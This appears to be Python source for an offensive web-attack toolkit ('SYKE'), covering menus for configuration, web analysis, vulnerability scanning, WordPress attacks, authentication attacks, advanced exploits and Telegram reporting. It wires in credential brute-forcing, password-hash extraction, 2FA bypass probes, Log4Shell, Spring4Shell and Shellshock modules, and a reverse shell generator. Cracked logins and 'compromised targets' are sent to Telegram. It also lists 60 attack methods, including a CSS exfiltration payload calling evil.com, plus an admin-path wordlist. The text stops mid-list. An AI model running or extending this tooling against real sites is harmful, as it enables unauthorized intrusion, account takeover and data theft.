    lhost       = _ask("LHOST (blank=skip)").strip() or None
    lport_s     = _ask("LPORT (blank=skip)").strip()
    lport       = int(lport_s) if lport_s.isdigit() else None
    sess        = _make_waf_session()
    results     = run_exploit_chain_preset(
        sess, base, preset_name, lhost=lhost, lport=lport, timeout=TIMEOUT)
    lines = [
        f"{GRN}Preset:{RST} {preset_name}",
        f"{GRN}Steps completed:{RST} {len(results)}",
    ]
    for k, v in results.items():
        if k != "_preset":
            size = (len(v) if isinstance(v, (list, dict))
                    else str(v)[:20])
            lines.append(f"{CYN}{k}:{RST} {size}")
    _result_box("CHAIN COMPLETE", lines)
    _pause()


                                                                                 
                     
                                                                                 

def config_menu():
    global THREADS, TIMEOUT, DELAY, PROXY, PROXY_CFG, VERBOSE, DEBUG_MODE
    global DISCORD_HOOK, TELEGRAM_BOT, TELEGRAM_CID, VERIFY_SSL, OUT_DIR
    while True:
        _banner()
        _menu_box("CONFIGURATION",[
            f"[01]  Threads         {THREADS}",
            f"[02]  Timeout         {TIMEOUT}s",
            f"[03]  Delay           {DELAY}s",
            f"[04]  Proxy           {PROXY or 'none'}",
            f"[05]  Verbose         {VERBOSE}",
            f"[06]  Verify SSL      {VERIFY_SSL}",
            f"[07]  Output dir      {OUT_DIR}",
            f"[08]  Discord webhook {'set' if DISCORD_HOOK else 'none'}",
            f"[09]  Telegram bot    {'set' if TELEGRAM_BOT else 'none'}",
            f"[10]  Debug mode      {DEBUG_MODE}",
            "[00]  Back",
        ])
        ch = _ask("config-option").strip()
        if ch == "1":
            v = _ask("threads (1-200)").strip()
            if v.isdigit():
                THREADS = max(1, min(200, int(v)))
                _clean(f"Threads → {THREADS}")
        elif ch == "2":
            v = _ask("timeout (secs)").strip()
            if v.replace(".","").isdigit():
                TIMEOUT = float(v)
                _clean(f"Timeout → {TIMEOUT}s")
        elif ch == "3":
            v = _ask("delay between requests (0=off)").strip()
            if v.replace(".","").isdigit():
                DELAY = float(v)
                _clean(f"Delay → {DELAY}s")
        elif ch == "4":
            v = _ask("proxy (http://host:port or blank=clear)").strip()
            PROXY = v or None
            PROXY_CFG = PROXY
            _clean(f"Proxy → {PROXY or 'cleared'}")
        elif ch == "5":
            VERBOSE = not VERBOSE
            _clean(f"Verbose → {VERBOSE}")
        elif ch == "6":
            VERIFY_SSL = not VERIFY_SSL
            _clean(f"Verify SSL → {VERIFY_SSL}")
        elif ch == "7":
            v = _ask("output directory").strip()
            if v:
                OUT_DIR = v
                os.makedirs(OUT_DIR, exist_ok=True)
                _clean(f"Output dir → {OUT_DIR}")
        elif ch == "8":
            DISCORD_HOOK = _ask(
                "discord webhook URL (blank=clear)").strip() or None
            _clean("Discord webhook updated")
        elif ch == "9":
            TELEGRAM_BOT = _ask(
                "telegram bot token").strip() or TG_BOT_TOKEN or None
            TELEGRAM_CID = _ask(
                "telegram chat id (blank=use group)").strip() or None
            _clean("Telegram config updated")
        elif ch == "10":
            DEBUG_MODE = not DEBUG_MODE
            _clean(f"Debug → {DEBUG_MODE}")
        elif ch in ("0",""):
            break
        else:
            time.sleep(0.3)


                                                                                 
            
                                                                                 

def web_menu(target=None):
    while True:
        _banner()
        if target:
            print(f"{BLU}\n  target: {target}\n{RST}")
        _menu_box("WEB ANALYSIS",[
            "[01]  Technology Fingerprint",
            "[02]  Security Headers",
            "[03]  WAF Detection",
            "[04]  SSL/TLS Analysis",
            "[05]  Backup & Exposure Scan",
            "[06]  JavaScript Analyzer",
            "[07]  Email Harvester",
            "[08]  Sitemap Enumeration",
            "[09]  Directory Brute-Force",
            "[10]  Full Web Analysis",
            "[11]  Site Hooker (HTML/CSS/JS → TG)",
            "[00]  Back",
        ])
        ch = _ask("web-option").strip()
        url = (target or
               (_ask("target-url").strip() if ch not in ("0","") else ""))
        if not url and ch not in ("0",""):
            continue
        if ch == "1": fingerprint(url)
        elif ch == "2": security_headers_scan(url)
        elif ch == "3": waf_detect(url)
        elif ch == "4": ssl_scan(url)
        elif ch == "5": backup_scan(url)
        elif ch == "6": js_analyzer(url)
        elif ch == "7": email_harvester(url)
        elif ch == "8":
            _banner()
            base = normalize_base(url)
            sess = _make_session()
            r    = sitemap_enum(sess, base, TIMEOUT)
            _result_box("SITEMAP",[
                f"{GRN}{x['type']}{RST}  {x['url'][:60]}"
                for x in r[:30]
            ] or [f"{DIM}No sitemap found{RST}"])
            _pause()
        elif ch == "9":
            _banner()
            base = normalize_base(url)
            sess = _make_session()
            r    = directory_bruteforce(sess, base)
            _result_box("DIRS FOUND",[
                f"{GRN}[{x['status']}]{RST} {x['path']}"
                for x in r[:30]
            ] or [f"{DIM}No directories found{RST}"])
            _pause()
        elif ch == "10": full_scan(url)
        elif ch == "11": site_hooker(url)
        elif ch in ("0",""): break
        else: time.sleep(0.3)

def vuln_menu(target=None):
    while True:
        _banner()
        if target:
            print(f"{BLU}\n  target: {target}\n{RST}")
        _menu_box_split("VULNERABILITY SCANNER",[
            "[01] SQLi Scanner",
            "[02] LFI/RFI Scanner",
            "[03] SSRF Scanner",
            "[04] XSS + SSTI",
            "[05] CMD Injection",
            "[06] XXE Probe",
            "[07] NoSQL Injection",
            "[08] Open Redirect",
            "[09] CORS Audit",
            "[10] CRLF Injection",
            "[11] Host Header Injection",
            "[12] LDAP Injection",
            "[13] XPath Injection",
            "[14] HTML Injection",
            "[15] HTTP Param Pollution",
            "[16] Upload Bypass",
            "[17] Deserialization",
            "[18] Prototype Pollution",
            "[19] Mass Assignment",
            "[20] HTTP Method Override",
            "[21] Business Logic",
            "[22] Race Condition",
            "[23] IDOR Scanner",
            "[24] Full Vuln Scan",
            "[00] Back",
        ], divider_after={10})
        ch = _ask("vuln-option").strip()
        url = (target or
               (_ask("target-url").strip() if ch not in ("0","") else ""))
        if not url and ch not in ("0",""):
            continue
        if ch == "1":   sqli_scan(url)
        elif ch == "2": lfi_scan(url)
        elif ch == "3": ssrf_scan(url)
        elif ch == "4": xss_scan(url)
        elif ch == "5": cmd_injection_scan(url)
        elif ch == "6": xxe_scan(url)
        elif ch == "7": nosql_scan(url)
        elif ch == "8": open_redirect_scan(url)
        elif ch == "9": cors_scan(url)
        elif ch == "10": crlf_scan(url)
        elif ch == "11": host_header_injection(url)
        elif ch == "12": ldap_injection_scan(url)
        elif ch == "13": xpath_injection_scan(url)
        elif ch == "14": html_injection_scan(url)
        elif ch == "15": http_param_pollution(url)
        elif ch == "16": file_upload_bypass(url)
        elif ch == "17": deserialization_scan(url)
        elif ch == "18": prototype_pollution_scan(url)
        elif ch == "19": mass_assignment_scan(url)
        elif ch == "20": http_method_override(url)
        elif ch == "21": business_logic_test(url)
        elif ch == "22": race_condition_test(url)
        elif ch == "23": idor_scan(url)
        elif ch == "24": full_scan(url)
        elif ch in ("0",""): break
        else: time.sleep(0.3)

def auth_menu(target=None):
    while True:
        _banner()
        if target:
            print(f"{BLU}\n  target: {target}\n{RST}")
        _menu_box("AUTH & BRUTE-FORCE",[
            "[01]  Auth Bypass",
            "[02]  JWT Attack Module",
            "[03]  OAuth / OIDC Audit",
            "[04]  XSS Reflection Scanner",
            "[05]  CORS Misconfiguration",
            "[06]  CSRF Token Check",
            "[07]  2FA Bypass Probes",
            "[08]  Session Fixation Check",
            "[00]  Back",
        ])
        ch = _ask("auth-option").strip()
        url = (target or
               (_ask("target-url").strip() if ch not in ("0","") else ""))
        if not url and ch not in ("0",""):
            continue
        if ch == "1":   auth_bypass_scan(url)
        elif ch == "2": jwt_attack()
        elif ch == "3": oauth_audit(url)
        elif ch == "4": xss_reflect_scan()
        elif ch == "5": cors_scan(url)
        elif ch == "6":
            _banner()
            _info(f"CSRF check → {url}")
            sess = _make_session()
            r    = check_http_security_headers(sess, normalize_base(url))
            if not r.get("present",{}).get("X-Frame-Options"):
                _vuln("X-Frame-Options missing — clickjacking risk")
            _pause()
        elif ch == "7":
            _banner()
            base = normalize_base(url)
            _info(f"2FA Bypass probes → {base}")
            twofa_paths = [
                "/api/v1/2fa", "/api/2fa/verify", "/verify",
                "/api/verify", "/auth/verify", "/2fa",
            ]
            for path in twofa_paths:
                for code in ["000000","111111","123456","999999"]:
                    try:
                        r = _post(base+path,
                                  json={"code": code, "otp": code,
                                        "token": code})
                        if r and r.status_code in (200,201):
                            if "success" in r.text.lower():
                                _vuln(f"2FA bypass: {path}  code={code}")
                    except Exception:
                        pass
            _pause()
        elif ch == "8":
            _banner()
            base = normalize_base(url)
            sess = _make_session()
            r    = session_fixation_check(sess, base, TIMEOUT)
            if r.get("vulnerable"):
                _vuln(f"Session fixation: cookies not rotated on auth")
            else:
                _clean("No session fixation detected")
            _pause()
        elif ch in ("0",""): break
        else: time.sleep(0.3)

def wp_menu(target=None):
    while True:
        _banner()
        if target:
            print(f"{BLU}\n  target: {target}\n{RST}")
        _menu_box("WORDPRESS TOOLKIT",[
            "[01] User Enumeration",
            "[02] Plugin Enumeration",
            "[03] Theme Enumeration",
            "[04] Version + CVE Check",
            "[05] xmlrpc Probe",
            "[06] xmlrpc Brute-Force",
            "[07] WP Login Brute-Force",
            "[08] Backup Finder",
            "[09] Secret Finder",
            "[10] REST API Endpoints",
            "[11] JWT / Auth Keys",
            "[12] Hash Extract",
            "[13] WP-Cron Abuse",
            "[14] WP Full Audit",
            "[15] Multisite Probe",
            "[16] MU-Plugins Check",
            "[17] WAF Evasion Test",
            "[18] DB Prefix Scan",
            "[19] Interesting Files",
            "[20] Full WP Audit",
            "[00] Back",
        ])
        ch = _ask("wp-option").strip()
        url = (target or
               (_ask("target-url").strip() if ch not in ("0","") else ""))
        if not url and ch not in ("0",""):
            continue
        ok_, u, _ = check_host(url)
        if not ok_ and ch not in ("0",""):
            continue
        base = normalize_base(u or url)
        sess = _make_waf_session()
        if ch == "1":
            _banner()
            _info(f"User Enum → {base}")
            r = enumerate_users(sess, base, TIMEOUT)
            _result_box("USERS",[
                f"{GRN}@{u['login']}{RST}  id={u['id']}"
                for u in r[:20]
            ] or [f"{DIM}No users found{RST}"])
            if r:
                _found_box("USER ENUMERATION", base,
                           "\n".join(u['login'] for u in r[:5]), found=True)
            _pause()
        elif ch == "2":
            _banner()
            _info(f"Plugins → {base}")
            r = enumerate_plugins(sess, base, TIMEOUT)
            _result_box("PLUGINS",[
                f"{GRN}[{x['status']}]{RST} {x['plugin']}"
                for x in r[:30]
            ] or [f"{DIM}No plugins found{RST}"])
            _pause()
        elif ch == "3":
            _banner()
            _info(f"Themes → {base}")
            r = enumerate_themes(sess, base, TIMEOUT)
            _result_box("THEMES",[
                f"{GRN}[{x['status']}]{RST} {x['theme']}"
                for x in r[:20]
            ] or [f"{DIM}No themes found{RST}"])
            _pause()
        elif ch == "4":
            _banner()
            _info(f"Version + CVE → {base}")
            r = wp_version_check_vuln(sess, base, TIMEOUT)
            lines = [f"{GRN}Version:{RST} {r.get('version','?')}"]
            if r.get("cve"):
                lines.append(f"{RED}CVE:{RST} {r['cve']}")
                lines.append(f"{RED}Desc:{RST} {r['desc']}")
                _found_box("WP VERSION CVE", base,
                           f"{r['cve']}: {r['desc']}", found=True)
            _result_box("VERSION + CVE", lines)
            _pause()
        elif ch == "5":
            _banner()
            _info(f"xmlrpc → {base}")
            r = xmlrpc_probe(sess, base, TIMEOUT)
            if r.get("enabled"):
                _vuln("XML-RPC enabled")
                _result_box("XMLRPC",[
                    f"{RED}ENABLED{RST}",
                    *([f"{CYN}{m}{RST}" for m in r.get("methods",[])[:15]])
                ])
                _found_box("XMLRPC ENABLED", base,
                           "XML-RPC interface accessible", found=True)
            else:
                _clean("XML-RPC disabled")
                _found_box("XMLRPC", base, "Not enabled", found=False)
            _pause()
        elif ch == "6":
            _banner()
            users = enumerate_users(sess, base, TIMEOUT)
            if not users:
                _warn("No users found — manual username entry")
                uname = _ask("username")
                users = [{"login": uname}] if uname else []
            for u in users[:3]:
                _info(f"Brute xmlrpc: user={u['login']}")
                r = xmlrpc_bruteforce(sess, base, u["login"], TIMEOUT)
                if r.get("cracked"):
                    _vuln(f"CRACKED: {u['login']}  / {r['password']}")
                    _found_box("XMLRPC BRUTE", base,
                               f"{u['login']}:{r['password']}", found=True)
                    _save_results(base, base+"/wp-login.php",
                                  {"user": u["login"], "pass": r["password"]})
            _pause()
        elif ch == "7":
            _banner()
            _info(f"WP Login brute → {base}")
            r = full_login_bruteforce(sess, base, TIMEOUT)
            if r:
                _result_box("LOGIN BRUTE",[
                    f"{RED}[CRACKED]{RST} {x['username']}:{x['password']}"
                    for x in r[:5]
                ])
                for x in r:
                    _found_box("WP LOGIN CRACKED", base,
                               f"{x['username']}:{x['password']}", found=True)
                    _save_results(base, x["url"],
                                  {"user": x["username"],
                                   "pass": x["password"]})
            else:
                _clean("No credentials found")
            _pause()
        elif ch == "8":
            _banner()
            r = backup_finder(sess, base, TIMEOUT)
            _result_box("BACKUPS",[
                f"{RED}{x['path']}{RST}  {x['size']}b"
                for x in r[:20]
            ] or [f"{GRN}No backups found{RST}"])
            _pause()
        elif ch == "9":
            _banner()
            r = find_exposed_secrets(sess, base, TIMEOUT)
            _result_box("SECRETS",[
                f"{RED}{x['path']}{RST}  {x['type']}"
                for x in r[:10]
            ] or [f"{GRN}No secrets found{RST}"])
            _pause()
        elif ch == "10":
            _banner()
            _info(f"REST API → {base}")
            endpoints = {**WP_API_ENDPOINTS_EXTRA,
                         **{ep: "Core" for ep in REST_ENDPOINTS}}
            for path, desc in list(endpoints.items())[:25]:
                try:
                    r = sess.get(base+path, timeout=TIMEOUT,
                                 verify=VERIFY_SSL)
                    if r and r.status_code == 200:
                        _found(f"[200] {path}  ({desc})")
                except Exception:
                    pass
            _pause()
        elif ch == "11": jwt_attack()
        elif ch == "12":
            _banner()
            r = extract_wp_hashes(sess, base)
            _result_box("HASHES",[
                f"{RED}{x['hash']}{RST}" for x in r[:10]
            ] or [f"{DIM}No hashes extracted{RST}"])
            _pause()
        elif ch == "13":
            _banner()
            _info(f"WP-Cron → {base}")
            r = cron_trigger_abuse(sess, base, TIMEOUT)
            _result_box("WP-CRON",[
                f"{RED}DoS RISK{RST}  response={r.get('time','?')}s"
                if r.get("dos_risk") else
                f"{GRN}response={r.get('time','?')}s{RST}"
            ])
            _pause()
        elif ch == "14": wp_full_audit(url)
        elif ch == "15":
            _banner()
            r = multisite_probe(sess, base, TIMEOUT)
            _result_box("MULTISITE",[
                f"{GRN}{x['path']}{RST}  [{x['status']}]"
                for x in r[:20]
            ] or [f"{DIM}No multisite paths{RST}"])
            _pause()
        elif ch == "16":
            _banner()
            r = check_mu_plugins(sess, base, TIMEOUT)
            _result_box("MU-PLUGINS",[
                f"{YLW}{x['path']}{RST}  {x['size']}b"
                for x in r[:10]
            ] or [f"{GRN}No mu-plugin exposure{RST}"])
            _pause()
        elif ch == "17":
            _banner()
            r = waf_evasion_test(sess, base)
            _result_box("WAF EVASION",[
                f"{YLW}{list(x['headers'].keys())[0]}{RST}  HTTP {x['status']}"
                for x in r[:10]
            ] or [f"{DIM}No bypass found{RST}"])
            _pause()
        elif ch == "18":
            _banner()
            prefix = scan_wp_db_prefix(sess, base, TIMEOUT)
            _result_box("DB PREFIX",[f"{GRN}Detected prefix:{RST} {prefix}"])
            _pause()
        elif ch == "19":
            _banner()
            r = scan_interesting_files(sess, base, depth=1, timeout=TIMEOUT)
            _result_box("INTERESTING FILES",[
                f"{GRN}{x['url']}{RST}  {x['ext']}  {x['size']}b"
                for x in r[:20]
            ] or [f"{GRN}No interesting files{RST}"])
            _pause()
        elif ch == "20": wp_full_audit(url)
        elif ch in ("0",""): break
        else: time.sleep(0.3)

def advanced_menu(target=None):
    while True:
        _banner()
        if target:
            print(f"{BLU}\n  target: {target}\n{RST}")
        _menu_box_split("ADVANCED ATTACK MODULES",[
            "[01] HTTP Request Smuggling",
            "[02] Cache Poisoning",
            "[03] Prototype Pollution",
            "[04] GraphQL Audit",
            "[05] Log4Shell (CVE-2021-44228)",
            "[06] Spring4Shell (CVE-2022-22965)",
            "[07] Shellshock (CVE-2014-6271)",
            "[08] IIS Tilde Enumeration",
            "[09] Nginx Alias Traversal",
            "[10] Database Exposure",
            "[11] DevTools Exposure",
            "[12] JWT Attack Module",
            "[13] OAuth/OIDC Audit",
            "[14] Subdomain Takeover Check",
            "[15] S3 Bucket Enumeration",
            "[16] Reverse Shell Generator",
            "[17] Deserialization Scanner",
            "[00] Back",
        ], divider_after={9})
        ch = _ask("advanced-option").strip()
        url = (target or
               (_ask("target-url").strip() if ch not in ("0","") else ""))
        if not url and ch not in ("0",""):
            continue
        if ch == "1":    http_smuggling_test(url)
        elif ch == "2":  cache_poisoning_test(url)
        elif ch == "3":  prototype_pollution_scan(url)
        elif ch == "4":  graphql_audit(url)
        elif ch == "5":  log4shell_scan(url)
        elif ch == "6":  spring4shell_scan(url)
        elif ch == "7":  shellshock_scan(url)
        elif ch == "8":  iis_tilde_enum(url)
        elif ch == "9":  nginx_alias_traversal(url)
        elif ch == "10": database_exposure_scan(url)
        elif ch == "11": devtools_exposure_scan(url)
        elif ch == "12": jwt_attack()
        elif ch == "13": oauth_audit(url)
        elif ch == "14":
            _banner()
            base = normalize_base(url)
            host = urlparse(base).hostname
            parts = host.split(".")
            dom   = ".".join(parts[-2:]) if len(parts) >= 2 else host
            _info(f"Subdomain Takeover → {dom}")
            for sub in SUBDOMAIN_WORDLIST[:100]:
                fqdn = f"{sub}.{dom}"
                try:
                    socket.getaddrinfo(fqdn, None)
                    for fp_domain, fp_text in TAKEOVER_FINGERPRINTS.items():
                        if fp_domain in fqdn:
                            try:
                                r = _get(f"https://{fqdn}", timeout=5)
                                if r and fp_text.lower() in r.text.lower():
                                    _vuln(f"TAKEOVER: {fqdn}  ← {fp_domain}")
                                    _found_box("SUBDOMAIN TAKEOVER",
                                               fqdn, fp_domain, found=True)
                            except Exception:
                                pass
                except Exception:
                    pass
            _pause()
        elif ch == "15": s3_bucket_enum(url)
        elif ch == "16": revshell_generator()
        elif ch == "17": deserialization_scan(url)
        elif ch in ("0",""): break
        else: time.sleep(0.3)

def recon_menu(target=None):
    while True:
        _banner()
        if target:
            print(f"{BLU}\n  target: {target}\n{RST}")
        _menu_box("RECON & OSINT",[
            "[01] Port Scanner",
            "[02] Subdomain Scanner",
            "[03] DNS Recon",
            "[04] Reverse IP Lookup",
            "[05] SSL/TLS Analysis",
            "[06] Email Harvester",
            "[07] Technology Fingerprint",
            "[08] Sitemap Enumeration",
            "[09] Directory Brute-Force",
            "[10] Subdomain Takeover Check",
            "[00] Back",
        ])
        ch = _ask("recon-option").strip()
        url = (target or
               (_ask("target-url").strip() if ch not in ("0","") else ""))
        if not url and ch not in ("0",""):
            continue
        if ch == "1":    port_scan_fn(url)
        elif ch == "2":  subdomain_scan_fn(url)
        elif ch == "3":  dns_recon_fn(url)
        elif ch == "4":  reverse_ip_lookup(url)
        elif ch == "5":  ssl_scan(url)
        elif ch == "6":  email_harvester(url)
        elif ch == "7":  fingerprint(url)
        elif ch == "8":
            _banner()
            base = normalize_base(url)
            sess = _make_session()
            r    = sitemap_enum(sess, base, TIMEOUT)
            _result_box("SITEMAP",[
                f"{GRN}{x['type']}{RST}  {x['url'][:60]}"
                for x in r[:30]
            ] or [f"{DIM}No sitemap found{RST}"])
            _pause()
        elif ch == "9":
            _banner()
            base = normalize_base(url)
            sess = _make_session()
            r    = directory_bruteforce(sess, base)
            _result_box("DIRS",[
                f"{GRN}[{x['status']}]{RST} {x['path']}"
                for x in r[:30]
            ] or [f"{DIM}No dirs{RST}"])
            _pause()
        elif ch == "10":
            _banner()
            base = normalize_base(url)
            host = urlparse(base).hostname
            parts = host.split(".")
            dom   = ".".join(parts[-2:]) if len(parts) >= 2 else host
            _info(f"Takeover check → {dom}")
            findings = []
            for sub in SUBDOMAIN_WORDLIST[:100]:
                fqdn = f"{sub}.{dom}"
                try:
                    socket.getaddrinfo(fqdn, None)
                    for fp_domain, fp_text in TAKEOVER_FINGERPRINTS.items():
                        try:
                            r = _get(f"https://{fqdn}", timeout=5)
                            if r and fp_text.lower() in r.text.lower():
                                findings.append(fqdn)
                                _vuln(f"TAKEOVER: {fqdn}  ← {fp_domain}")
                        except Exception:
                            pass
                except Exception:
                    pass
            _result_box("TAKEOVER CANDIDATES",[
                f"{RED}{f}{RST}" for f in findings[:20]
            ] or [f"{GRN}No candidates{RST}"])
            _pause()
        elif ch in ("0",""): break
        else: time.sleep(0.3)

def results_menu():
    while True:
        _banner()
        _menu_box("RESULTS & REPORTS",[
            "[01] View compromised targets",
            "[02] View all findings",
            "[03] Export HTML report",
            "[04] Export CSV + JSON",
            f"[05] Stats: {_stats_bar()}",
            "[06] Send findings to Telegram",
            "[00] Back",
        ])
        ch = _ask("results-option").strip()
        if ch == "1":
            _display_pwned_list()
            _pause()
        elif ch == "2":
            _display_findings_summary()
            _pause()
        elif ch == "3":
            out = _ask("filename [blank=report.html]").strip() or "report.html"
            generate_report(None, output_html=out)
            _clean(f"HTML report: {out}")
            _pause()
        elif ch == "4":
            _export_results_formats()
            _pause()
        elif ch == "5":
            print(f"\n{_stats_bar()}\n")
            _pause()
        elif ch == "6":
            summary = (
                f"SYKE Results Summary\n"
                f"User: {CURRENT_USER or 'unknown'}\n"
                f"CRITICAL: {STATS['crit']}  HIGH: {STATS['hi']}  "
                f"MED: {STATS['med']}  LOW: {STATS['lo']}\n"
                f"Total findings: {STATS['total']}\n"
                f"Compromised: {len(PWNED_LIST)}"
            )
            _tg_send(summary, TG_RESULT_GROUP)
            _clean("Sent to Telegram group")
            _pause()
        elif ch in ("0",""):
            break
        else:
            time.sleep(0.3)

def tg_bot_menu():
    global TELEGRAM_BOT
    _banner()
    _menu_box("TELEGRAM BOT MANAGER",[
        f"[1] Start polling bot (token: {'set' if TELEGRAM_BOT else 'NOT SET'})",
        "[2] Set bot token",
        "[3] Send test message to group",
        "[4] View registered users",
        "[0] Back",
    ])
    ch = _ask("tg-option").strip()
    if ch == "0":
        return
    if ch == "1":
        if not TELEGRAM_BOT:
            _err("No bot token. Set it first.")
        else:
            _clean("Starting bot polling (Ctrl+C to stop)...")
            bot = SykeBot(TELEGRAM_BOT)
            bot.run_polling()
    elif ch == "2":
        tok = _ask("bot-token").strip()
        if tok:
            TELEGRAM_BOT = tok
            _clean("Bot token set")
    elif ch == "3":
        msg = _ask("message-to-send")
        if msg:
            _tg_send(msg, TG_RESULT_GROUP)
            _clean("Message sent")
    elif ch == "4":
        users = _load_users()
        if users:
            _result_box("REGISTERED USERS",[
                f"{GRN}{uname}{RST}  {DIM}joined: {v.get('joined','?')}{RST}"
                for uname, v in users.items()
            ])
        else:
            _result_box("REGISTERED USERS",[f"{DIM}No users yet{RST}"])
    _pause()


                                                                                 
                                                         
                                                                                 

SUGGESTED_NEW_METHODS_50 = [
    "[01] JWT algorithm confusion RS256→HS256: sign forged token with server public key as HMAC secret",
    "[02] JWT alg:none bypass: strip signature, set alg:none — legacy libs skip verification",
    "[03] JWT kid path traversal: kid:../../dev/null signs with empty string bypassing secret check",
    "[04] SAML signature wrapping: inject evil assertion wrapped around valid signature node",
    "[05] OAuth implicit flow token theft: leak access_token via open redirect to attacker domain",
    "[06] OAuth PKCE downgrade: strip code_challenge param, steal auth code via Referer header",
    "[07] OAuth device code phishing: get long-lived tokens via fake device auth confirmation page",
    "[08] Password reset Host header poisoning: inject X-Forwarded-Host to redirect reset link",
    "[09] 2FA response tampering: flip {verified:false} to {verified:true} in mid-session JSON",
    "[10] 2FA race condition: concurrent requests share OTP window — only one rate-limit check fires",
    "[11] Cookie tossing: plant subdomain cookie to shadow parent-domain auth cookie in browser",
    "[12] Cookie prefix bypass: circumvent __Host- and __Secure- via subdomain takeover",
    "[13] Session fixation: plant known token pre-login, inherit authenticated state post-login",
    "[14] HTTP request smuggling CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding",
    "[15] HTTP request smuggling TE.CL: poison back-end request queue via chunk-size mismatch",
    "[16] Web cache deception: /profile/nonexistent.css causes cache to store authenticated content",
    "[17] Cache poisoning via unkeyed headers: X-Forwarded-Host reflected in cached response",
    "[18] Prototype pollution: __proto__[admin]=true poisons server-side object inheritance",
    "[19] DOM clobbering: named form elements shadow window properties bypassing CSP nonces",
    "[20] CSS injection data exfil: input[value^=a]{background:url(http://evil.com/?a)} leaks form data",
    "[21] GraphQL batching rate-limit bypass: 1000 mutations in single HTTP request",
    "[22] GraphQL field-level auth bypass: query individual resolver fields skipping top-level authz",
    "[23] GraphQL type confusion: abuse __typename to discover hidden types not in schema",
    "[24] WebSocket CSWSH: cross-site WebSocket hijacking to steal authenticated WS session data",
    "[25] LDAP injection auth bypass: username=*)(&)(objectclass=* wildcards collapse filter to true",
    "[26] XPath injection: ' or 1=1 or ''=' bypasses XML-based authentication",
    "[27] Padding oracle CBC bit-flipping: forge valid encrypted cookies without knowing key",
    "[28] ECDSA nonce reuse k-recovery: two signatures with same k leak private key via math",
    "[29] Type juggling: password:true (boolean) bypasses PHP == / JS == loose string comparison",
    "[30] Mass assignment privilege escalation: PATCH /me with {role:admin} or {isAdmin:true}",
    "[31] Parameter pollution auth bypass: token=legit&token=FORGED — WAF checks first, app last",
    "[32] X-Forwarded-For whitelist bypass: spoof 127.0.0.1 to reach internal-admin-only endpoints",
    "[33] Referer-based auth gate bypass: forge Referer:https://admin.target.com/ on guarded routes",
    "[34] Path normalization bypass: /admin%2f../endpoint decoded differently by WAF vs back-end",
    "[35] Unicode normalization: /ᴬdmin folds to /Admin after server NFC/NFKD normalization",
    "[36] Double URL-encode bypass: %252F decoded twice strips WAF rule matching only %2F",
    "[37] Null byte injection: /admin%00/public tricks auth middleware — server strips the null",
    "[38] HTTP verb tampering: TRACE/CONNECT bypasses ACL rules defined only for GET/POST",
    "[39] IDOR UUID v1 timestamp prediction: derive sequential resource IDs from known timestamp",
    "[40] Account takeover via sub-addressing: victim+x@domain bypasses unique-email check",
    "[41] SSRF via PDF/image generation: embed SSRF URL in HTML-to-PDF or image resize endpoint",
    "[42] Blind SSRF via DNS callback: embed JNDI/OOB SSRF in headers — detect via DNS ping-back",
    "[43] Log poisoning via access log LFI: inject PHP into User-Agent then include access.log via LFI",
    "[44] Zip slip archive traversal: craft zip with ../../../etc/cron.d/shell entry path",
    "[45] AWS IMDSv1 SSRF full chain: SSRF → 169.254.169.254 → IAM credentials → S3/EC2 pivot",
    "[46] Azure IMDS exploitation: SSRF to 169.254.169.254/metadata/instance with Metadata:true header",
    "[47] Spring Boot actuator env exposure: /actuator/env leaks all environment variables and secrets",
    "[48] Dependency confusion supply-chain: publish public package with same name as internal package",
    "[49] DNS rebinding: TTL=0 record swaps IP mid-session bypassing same-origin browser policy",
    "[50] Business email compromise via SPF bypass: abuse subdomain with no SPF for spoofed sender",
    "[51] Heartbleed (CVE-2014-0160): TLS heartbeat request leaks server process memory contents",
    "[52] Apache Struts OGNL injection (CVE-2017-5638): Content-Type header RCE via OGNL expression",
    "[53] Drupalgeddon2 (CVE-2018-7600): unauthenticated RCE via form render API in Drupal core",
    "[54] Ghostcat (CVE-2020-1938): Tomcat AJP connector file inclusion for LFI/RCE via port 8009",
    "[55] ProxyLogon (CVE-2021-26855): Exchange pre-auth SSRF chain to arbitrary file write + RCE",
    "[56] ProxyShell (CVE-2021-34473): Exchange PowerShell backend unauthenticated RCE chain",
    "[57] PrintNightmare (CVE-2021-1675): Windows Print Spooler RCE via crafted printer driver install",
    "[58] Apache path traversal (CVE-2021-41773): %2e%2e/%2e%2e reads files outside document root",
    "[59] PwnKit (CVE-2021-4034): pkexec local privilege escalation via env variable manipulation",
    "[60] Text4Shell (CVE-2022-42889): Apache Commons Text interpolation RCE ${script:js:Runtime.exec}",
]

def print_suggested_methods():
    W   = 70
    sep = "═" * W
    print()
    print(BLU + f"  ╔{sep}╗" + RST)
    print(BLU + f"  ║  {'SYKE — 60 NEW SUGGESTED ATTACK METHODS':<{W}}║" + RST)
    print(BLU + f"  ╠{sep}╣" + RST)
    for line in SUGGESTED_NEW_METHODS_50:
        clean = re.sub(r'\033\[[0-9;]*m','', line)
        pad   = max(0, W - 2 - len(clean[:68]))
        print(BLU + "  ║" + RST +
              f"  {DIM}{line[:68]}{RST}" + " " * pad +
              BLU + "║" + RST)
    print(BLU + f"  ╚{sep}╝" + RST)
    print()
    _pause()



                                                                                 
                                              
                                                                                 

EXTENDED_ADMIN_PATHS_2 = list(dict.fromkeys([
    "/adm", "/adm/", "/adm.php", "/adm.html",
    "/admin-login", "/admin-login.php", "/admin-panel", "/admin-panel.php",
    "/admin_cp", "/admin_cp/", "/admin_db", "/admin_db/",
    "/admin_files", "/admin_files/", "/admin_images", "/admin_images/",
    "/admin_index", "/admin_index.php", "/admin_new", "/admin_new.php",
    "/admin_old", "/admin_old/", "/admin_pass", "/admin_pass.php",
    "/admin_portal", "/admin_portal/", "/admin_secure", "/admin_secure/",
    "/admin_test", "/admin_test/", "/admin_tools", "/admin_tools/",
    "/admin_upload", "/admin_upload/", "/admin_user", "/admin_user/",
    "/administration/index.php", "/administration/login.php",
    "/administration/admin.php", "/administe.php",
    "/adminpanel/login.php", "/adminpanel/index.php",
    "/admins/login.php", "/admins/index.php",
    "/administrator/login.php", "/administrator/admin.php",
    "/administrator/default.aspx", "/administrator/main.php",
    "/admintest", "/admintest/", "/admintool", "/admintool/",
    "/admintools", "/admintools/", "/adminview", "/adminview/",
    "/admn", "/admn/", "/admpanel", "/admpanel/",
    "/admusr", "/admusr/", "/adminhtml", "/adminhtml/",
    "/admins2", "/admins3", "/adminarea2", "/adminarea3",
    "/admin.cfm", "/admin.do", "/admin.nsf", "/admin.pl",
    "/admin.rb", "/admin.py", "/admin.sh",
    "/admin2", "/admin3", "/admin4", "/admin5", "/admin6", "/admin7",
